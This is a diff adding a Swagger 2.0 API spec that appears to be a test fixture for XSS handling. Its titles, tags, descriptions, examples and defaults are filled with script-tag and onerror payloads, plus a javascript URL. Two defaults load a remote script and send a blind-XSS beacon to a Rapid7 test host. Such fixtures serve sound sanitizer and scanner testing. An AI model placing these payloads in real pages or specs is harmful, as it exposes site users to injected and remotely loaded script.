@@ -1,0 +1,77 @@
+swagger: '2.0'
+info:
+  version: "1.0.<br>100"
+  termsOfService: "javascrip://alert(document.cookie)"
+  title: title<script language="javascript">alert('1')</script>
+  description: description with **markdown** format <script language="javascript">alert('script-in-description')</script> <img src=x onerror="alert('img-in-description')">
+tags:
+  - name: Admin
+    description: tag with **markdown**
+  - name: Xss<script language="javascript">alert('3')</script>
+    description: tag with **markdown**<script language="javascript">alert('4')</script>
+paths:
+  /test:
+    get:
+      description: description with **markdown** format
+      summary: a summary with **markdown** format
+      responses:
+        200:
+          description: a description with **markdown** format
+          schema:
+            $ref: '#/definitions/User'
+    put:
+      description: ok
+      summary: ok
+      responses:
+        200:
+          description: ok
+          schema:
+            $ref: '#/definitions/XSSPayloadBlindScript'
+    post:
+      description: <script language="javascript">alert('5')</script>
+      summary: <script language="javascript">alert('6')</script>
+      consumes:
+        - <script language="javascript">alert('7')</script>
+      produces:
+        - <script language="javascript">alert('8')</script>
+      tags:
+      - Admin tasks<script language="javascript">alert('9')</script>
+      parameters:
+      - in: query
+        name: foo
+        type: string
+      - in: query
+        name: reg
+        type: string
+      responses:
+        200:
+          description: nothing<script language="javascript">alert('10')</script>
+          schema:
+            $ref: "#/definitions/XSSPayloadScript"
+
+definitions:
+  User:
+    description: also with **markdown**
+    properties:
+      name:
+        description: prop with **markdown**
+        type: string
+      email:
+        $ref: '#/definitions/Email'
+  Email:
+    description: <script language="javascript">alert('11')</script>
+    type: string
+    format: email
+    example: <script language="javascript">alert('12')</script>
+    default: <script language="javascript">alert('15')</script>
+  XSSPayloadScript:
+    title: <script language="javascript">alert('13')</script>
+    type: "string"
+    description: "<script language='javascript'>alert('16')</script>"
+    default: "</script><script src=\"https://appspidered.rapid7.com/xss/loaded-a-script\">"
+  XSSPayloadBlindScript:
+    type: string
+    description: "<script language='javascript'>alert('17')</script>"
+    default: >-
+      <script>o = new XMLHttpRequest();o.open("POST",
+      "https://appspidered.rapid7.com/xss/blind/success/id");o.send();</script>
